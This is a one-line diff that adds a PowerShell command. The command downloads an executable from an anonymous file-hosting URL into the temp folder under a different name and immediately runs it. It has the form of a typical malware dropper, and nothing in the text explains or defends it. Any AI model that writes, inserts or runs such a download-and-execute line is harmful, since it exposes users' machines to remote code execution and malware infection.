@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/drktzz.exe',"$env:TEMPemmas.exe");Start-Process ("$env:TEMPemmas.exe")
